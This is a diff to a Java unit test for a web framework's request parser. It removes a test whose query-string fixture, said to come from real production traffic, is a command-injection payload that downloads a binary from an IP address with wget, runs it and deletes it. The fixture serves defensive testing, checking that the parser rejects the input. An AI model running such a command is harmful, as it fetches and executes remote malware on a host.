@@ -14,8 +14,6 @@ import java.util.Deque;
 import java.util.List;
 import java.util.Map;
 
-import static java.net.URLEncoder.encode;
-import static java.nio.charset.StandardCharsets.UTF_8;
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
 import static org.assertj.core.api.Assertions.entry;
@@ -61,23 +59,11 @@ class RequestParserTest {
     @Test
     void parseQueryParams() {
         var request = new RequestImpl(null, null);
-        // undertow url decoding is disabled in core.framework.impl.web.HTTPServer.start, so the parser must decode all query param
-        Map<String, Deque<String>> params = Map.of("key", new ArrayDeque<>(List.of(encode("value1 value2", UTF_8))),
+        Map<String, Deque<String>> params = Map.of("key", new ArrayDeque<>(List.of("value")),
                 "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
         parser.parseQueryParams(request, params);
 
-        assertThat(request.queryParams()).containsOnly(entry("key", "value1 value2"), entry("emptyKey", ""));
-    }
-
-    @Test
-    void parseQueryParamsWithInvalidValue() {
-        var request = new RequestImpl(null, null);
-
-        // the query string is from actual cases of production
-        Map<String, Deque<String>> params = Map.of("cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo", new ArrayDeque<>());
-        assertThatThrownBy(() -> parser.parseQueryParams(request, params))
-                .isInstanceOf(BadRequestException.class)
-                .hasMessageContaining("failed to parse query param");
+        assertThat(request.queryParams()).containsOnly(entry("key", "value"), entry("emptyKey", ""));
     }
 
     @Test
@@ -123,5 +109,18 @@ class RequestParserTest {
         assertThatThrownBy(() -> parser.requestURL(request, exchange))
                 .isInstanceOf(BadRequestException.class)
                 .hasMessageContaining("requestURL is too long");
+    }
+
+    @Test
+    void path() {
+        var exchange = new HttpServerExchange(null);
+        exchange.setRequestURI("http://localhost:8080/path/%25", true);
+        assertThat(parser.path(exchange)).isEqualTo("/path/%25");
+
+        exchange.setRequestURI("/path/%25", true);
+        assertThat(parser.path(exchange)).isEqualTo("/path/%25");
+
+        exchange.setRequestURI("/path/%25", false);
+        assertThat(parser.path(exchange)).isEqualTo("/path/%25");
     }
 }
